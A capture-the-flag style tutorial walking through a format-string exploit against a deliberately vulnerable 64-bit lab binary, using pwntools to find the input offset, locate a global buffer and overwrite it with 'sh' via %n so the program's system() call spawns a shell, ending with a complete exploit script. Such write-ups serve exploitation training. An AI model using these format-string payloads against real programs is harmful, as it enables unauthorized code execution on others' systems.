Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf0[100];

int main()
{
  char buf1[200];

  printf("Do you really want to escape, the celebration is nearing.\n");
  fgets(buf1, sizeof(buf1), stdin);

  strcpy(buf0, "ls -asl");
  printf(buf1);

  printf("Here look at all of the wonderful things you have to research.\n");
  system(buf0);
}
```

So we see here, that the exploit to this seems fairly sstraight forward. Just use the printf vulnearbillity to overwrite the value of buf0 with "sh" and we have a shell. However this time, we will be going about doing it using pwntools. Pwntools is a python library designed exclusively for solving ctf challenges, and it does make your life a whole lot easier.  For instance...

For packing hex strings in little endian for 32 bit and 64 bit, pwntools can handle that

```
>>> from pwn import *
>>> p64(0xdeadbeefdeadbeef)
'\xef\xbe\xad\xde\xef\xbe\xad\xde'
```

It can also pack strings, and other things as integers

```
>>> from pwn import *
>>> u64("escpescp")
8098443434456740709
```

It can pull addresses for symbols from programs just like object dump

```
>>> from pwn import *
>>> elf = ELF("f5_64")
[*] '/Hackery/escape/fmt_str/f5_64/f5_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
>>> context(binary=elf)
>>> print hex(elf.symbols["main"])
0x400606
```

These are only a couple of the conviniet things pwn tools can do.

Now to exploit this binary. The first thing that we will need is knowing the offset for where we can control out input.

```
$ python -c 'print "0000" + "%x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x"' | ./f5_64 
Do you really want to escape, the celebration is nearing.
000060144f.f7dd3790.a782439.60144f.252e7824.30303030.2e782432.2434252e.252e7824
Here look at all of the wonderful things you have to research.
total 4448
   4 drwxr-xr-x  2 guyinatuxedo root            4096 May  8 23:41 .
   4 drwxr-xr-x 14 guyinatuxedo root            4096 May  7 22:34 ..
4372 -rw-------  1 guyinatuxedo guyinatuxedo 4476928 May  8 19:45 core
   4 -rw-rw-r--  1 guyinatuxedo guyinatuxedo     336 May  8 22:26 exploit.py
  12 -rw-r--r--  1 guyinatuxedo guyinatuxedo   12288 May  8 23:41 .exploit.py.swp
   8 -rwxr-xr-x  1 guyinatuxedo root            7464 Feb 26 19:56 f5_64
   4 -rw-r--r--  1 guyinatuxedo root             352 Feb 26 19:51 f5_64.c
   4 -rw-------  1 guyinatuxedo guyinatuxedo     349 May  8 17:21 .gdb_history
   4 -rw-r--r--  1 guyinatuxedo guyinatuxedo     926 May  8 18:13 hi.py
   4 -rw-r--r--  1 guyinatuxedo root             109 Feb 26 19:09 out
   8 -rw-r--r--  1 guyinatuxedo root            5960 Feb 26 19:15 Readme.md
  12 -rwxrwxr-x  1 guyinatuxedo guyinatuxedo    8960 May  8 19:42 test
   4 -rw-r--r--  1 guyinatuxedo guyinatuxedo     291 May  8 19:42 test.c
   4 -rw-rw-r--  1 guyinatuxedo guyinatuxedo     275 May  8 21:30 test_exploit.py
$ python -c 'print "0000" + "%6$x"' | ./f5_64 
Do you really want to escape, the celebration is nearing.
000030303030
Here look at all of the wonderful things you have to research.
total 4448
   4 drwxr-xr-x  2 guyinatuxedo root            4096 May  8 23:41 .
   4 drwxr-xr-x 14 guyinatuxedo root            4096 May  7 22:34 ..
4372 -rw-------  1 guyinatuxedo guyinatuxedo 4476928 May  8 19:45 core
   4 -rw-rw-r--  1 guyinatuxedo guyinatuxedo     336 May  8 22:26 exploit.py
  12 -rw-r--r--  1 guyinatuxedo guyinatuxedo   12288 May  8 23:41 .exploit.py.swp
   8 -rwxr-xr-x  1 guyinatuxedo root            7464 Feb 26 19:56 f5_64
   4 -rw-r--r--  1 guyinatuxedo root             352 Feb 26 19:51 f5_64.c
   4 -rw-------  1 guyinatuxedo guyinatuxedo     349 May  8 17:21 .gdb_history
   4 -rw-r--r--  1 guyinatuxedo guyinatuxedo     926 May  8 18:13 hi.py
   4 -rw-r--r--  1 guyinatuxedo root             109 Feb 26 19:09 out
   8 -rw-r--r--  1 guyinatuxedo root            5960 Feb 26 19:15 Readme.md
  12 -rwxrwxr-x  1 guyinatuxedo guyinatuxedo    8960 May  8 19:42 test
   4 -rw-r--r--  1 guyinatuxedo guyinatuxedo     291 May  8 19:42 test.c
   4 -rw-rw-r--  1 guyinatuxedo guyinatuxedo     275 May  8 21:30 test_exploit.py
```

As you can see, our input is 6 QWORDS away. Our next step is to find the address of the buf0 char array. We can use pwntools to find that. First we need to designate the binary, then we can pull the symbol.

First designate the binary

```
$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> elf = ELF("./f5_64")
[*] '/Hackery/escape/fmt_str/f5_64/f5_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
>>> context(binary=elf)
```

Then we can pull the symbol

```
>>> elf.symbols["buf0"]
6294304
>>> hex(elf.symbols["buf0"])
'0x600b20'
>>> buf0_address = p64(elf.symbols["buf0"])
```

As you can see, the address for the buf0 char array is 0x0000000000600b20 (since it is ab and64 address, it needs those zeroes, however they don't change the value of the string). We packed the address in little endian then stored it in buf0_address. Now what's left is to start the process, craft the exploit, then use it. First let's start the binary.

```
>>> target = process("./f5_64")
[x] Starting local process './f5_64'
[+] Starting local process './f5_64': pid 29027
``` 

Next we will need to pack the string "sh" in a way that the binary can read it. We can do this by unpacking the string. Since it is 64 bit, it will need 8 characters but we can fill it with zeroes. Also if you were to unpack it as 32 bit for this, it would give you the same output (you would need to take off four zeroes). This will output as an integer, however we will need to convert it to a string for later.

```
>>> u64("sh\0\0\0\0\0\0")
26739
>>> sh = str(u64("sh\0\0\0\0\0\0"))
>>> sh
'26739'
```

Now we should be ready to craft the exploit. Our exploit should have atleast 11 characters (%26739x%8$n), so we will need to add an additional 5 characters to make it 16 so the address can be properly stored in a QWORD. This will move the address over to the eight QWORD. Now that we have all of the pieces, let's craft the exploit, then drop into an interactive prompt so we can use the shell!

```
>>> target.sendline("%" + sh + "x%8$n00000" + str(buf0_address))
>>> target.interactive()
```

One wall of text later...

```
             60143900000 
                         `Here look at all of the wonderful things you have to research.
ls
core      f5_64    hi.py  Readme.md  test.c
exploit.py  f5_64.c  out    test       test_exploit.py
cat out
Fine, while your busy running away I will start welcoming people. To the celebration. For you. Level Cleared
exit
[*] Got EOF while reading in interactive
exit
[*] Process './f5_64' stopped with exit code 0 (pid 4953)
[*] Got EOF while sending in interactive
>>> exit()
[*] Stopped process './f5_64' (pid 3922)
```

Just like that, we pwned the binary! Now to make things easier I made a python script that does what we just did in a python shell.

```
#First import pwn tools
from pwn import *

#Declare the binary, and run it
elf = ELF("./f5_64")
context(binary=elf)
target = process("./f5_64")

#Grab the buf0 address
buf0_address = p64(elf.symbols["buf0"])

#Unpack sh and store as a string
sh = str(u64("sh\0\0\0\0\0\0")) 

#Finish crafting the exploit and send it
target.sendline("%" + sh + "x%8$n00000" + str(buf0_address))

#Drop to an interactive prompt to use the shell
target.interactive()
```